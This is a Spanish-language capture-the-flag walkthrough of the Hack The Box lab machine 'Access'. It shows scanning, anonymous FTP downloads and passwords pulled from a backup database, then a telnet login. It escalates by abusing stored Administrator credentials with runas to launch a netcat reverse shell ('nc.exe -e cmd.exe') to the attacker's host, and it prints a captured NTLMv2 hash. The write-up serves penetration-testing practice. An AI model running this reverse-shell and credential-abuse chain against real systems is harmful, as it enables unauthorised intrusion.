---
tags:
title: Access - Easy (HTB)
permalink: /Access-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---

# Reconocimiento

```bash
nmap -sCV -p21,23,80 10.10.10.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-10 20:44 EDT
Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:47 (0:00:51 remaining)
Stats: 0:02:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:48 (0:01:13 remaining)
Nmap scan report for 10.10.10.98
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 194.19 seconds
```

# Service enumeration 

### Port 80 HTTP/S

Se nos presenta una pagina web sin nada pero nada de informacion.

![1540204955666](images/1540204955666.png)

##### Gobuster

```bash
gobuster -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x asp,aspx,txt

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.98/
[+] Threads      : 20
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : aspx,txt,asp
[+] Timeout      : 10s
=====================================================
2018/10/22 06:46:45 Starting gobuster
=====================================================
=====================================================
2018/10/22 07:02:18 Finished
=====================================================
```

Si enumeramos directorio no tiene nada.

### FTP - Port 21

```bash
ftp 10.10.10.98
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> bin
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 1.68 secs (3.2076 MB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> cd ../Engineer
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> get Acc*
local: Acc* remote: Acc*
200 PORT command successful.
550 The filename, directory name, or volume label syntax is incorrect.
ftp> get "Access Control.zip"
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

Conseguimos dos archivos. Un `.zip` y un `.mdb`.

## Shell as security

Intentando descomprimir el `.zip` vemos que nos pide una password, la cual no tenemos. Podriamos intentar `brute force` pero primero miremos el `.mdb` que es un archivo de base de datos de `Microsoft`.

```bash
file backup.mdb 
backup.mdb: Microsoft Access Database
```

Usando la herramienta `mdb-export` y `mdb-tables` podria listar las tablas.

```bash
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
acc_timeseg: 2
acc_wiegandfmt: 12
ACGroup: 6
action_log: 25
areaadmin: 4
auth_user: 4
DEPARTMENTS: 6
deptadmin: 8
LeaveClass: 4
LeaveClass1: 16
personnel_area: 2
TBKEY: 4
USERINFO: 6
ACUnlockComb: 11
AttParam: 20
auth_group: 2
SystemLog: 2
```

Vemos una interesante que es `auth_user` ahora voy a exportar el contenido a un archivo `.csv`.

```bash
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/access]
└─# mdb-export backup.mdb auth_user > auth_user.csv
                                                                                                                                                                                             
┌──(root㉿kali)-[/home/zs1n/Desktop/htb/access]
└─# head -n 20 auth_user.csv
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```

Y asi es como vemos una credencial para el usuario `admin`. Y con su password podria tratar de desbloquear el `.zip`.

```bash
7z x Access\ Control.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Would you like to replace the existing file:
  Path:     ./Access Control.pst
  Size:     0 bytes
  Modified: 2018-08-23 20:13:52
with the file from archive:
  Path:     Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y

                         
Enter password (will not be echoed):
Everything is Ok

Size:       271360
```

Y vemos que si lo que nos deja un archivo `.pst`. 

```bash
file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Y con `readpst` podria convertir el archivo a un formato `imbox`.

```bash
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```

De manera que asi podemos ver las credenciales para el usuario `security`. Y debido a que ni el puerto `22` ni el `5985 (WinRm)` no esta abierto vemos que el puerto `23` si lo esta por lo que podriamos conectarnos proporncionando las credenciales de `security`

```bash
telnet 10.10.10.98 23                               
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

## Shell as administrator

Listando credenciales guardadas en el Administrador del sistema. Vemos que hay credenciales guardadas del usuario `Administrator`.

```bash
cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

Y para poder utilizarlas podemos usar `runas.exe` para impersonar al usuario `administraotr`, el uso de este lo podemos ver explicado en este [enlace](https://juggernaut-sec.com/runas/).

>`RunAs` puede ser considerado como una versión menos capaz de sudo para Windows.

Probemos si nuestro plan de usar las credenciales para ejecutar un simple `whoami` funciona.

```powershell
c:\temp\scripts>runas.exe /env /noprofile /savecred /user:ACCESS\administrator "cmd.exe /c whoami > whoami.txt"

c:\temp\scripts>dir
 Volume in drive C has no label.
 Volume Serial Number is 8164-DB5F

 Directory of c:\temp\scripts

10/11/2025  03:26 AM    <DIR>          .
10/11/2025  03:26 AM    <DIR>          ..
08/21/2018  11:30 PM               157 1_CREATE_SYSDBA.sql
08/21/2018  11:30 PM                90 2_ALTER_SERVER_ROLE.sql
08/21/2018  11:30 PM               300 3_SP_ATTACH_DB.sql
08/21/2018  11:30 PM               100 4_ALTER_AUTHORIZATION.sql
08/21/2018  11:30 PM             1,802 README_FIRST.txt
03/12/2018  02:37 PM             5,013 RestartServiceByDescriptionNameLike.vbs
03/12/2018  02:37 PM             1,998 SetAccessRuleOnDirectory.vbs
03/12/2018  02:37 PM            26,624 sqlcommand.exe
03/12/2018  02:37 PM             3,855 SQLOpenFirewallPorts.vbs
03/12/2018  02:37 PM             5,277 SQLServerCfgPort.vbs
10/11/2025  03:26 AM                22 whoami.txt
              11 File(s)         45,238 bytes
               2 Dir(s)   3,340,804,096 bytes free

c:\temp\scripts>type whoami.txt
access\administrator
```

Como vemos que si, ponemos en marcha nuestro plan.
Primero subimos el `nc.exe` para una ves ejecutemos el `runas.exe` nos enviemos una shell como `administrator`.

Compartimos recurso a nivel de red el cual podamos acceder desde la maquina para poder descargarnos el `nc.exe`.

```bash
impacket-smbserver -smb2support smbFolder $(pwd)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.98,49163)
[*] AUTHENTICATE_MESSAGE (ACCESS\security,ACCESS)
[*] User ACCESS\security authenticated successfully
[*] security::ACCESS:aaaaaaaaaaaaaaaa:84aee85e37f539adbccc03677efff695:01010000000000008088a6d2563adc01eefe1c3c512bfb4c0000000001001000690052006f006300790042004a00520003001000690052006f006300790042004a0052000200100048006a005700570076004b0072006f000400100048006a005700570076004b0072006f00070008008088a6d2563adc0106000400020000000800300030000000000000000000000000200000863c2bcbca196a930956bf4a9e06d86b3d77250ab9fdf3d9e0df3a7ad926063d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
```

Y nos descargamos el `nc` con `net use`.

```powershell
net use \\10.10.16.2\smbFolder\nc.exe
The command completed successfully.
```

Una ves teniendo todo nuestras herramientas ejecutamos el `runas` usando las credeciales almacenadas de `administrator`.

```powershell
c:\Users\security\Downloads>runas.exe /env /noprofile /savecred /user:ACCESS\administrator "C:\Users\security\Downloads\nc.exe -e cmd.exe 10.10.16.2 443"
```

Y desde nuestro `netcat` anteriormente iniciado recibimos nuestra shell.

```bash
nc -nlvp 443                           
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.98] 49164
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\Users\security\Downloads>whoami
whoami
access\administrator
```

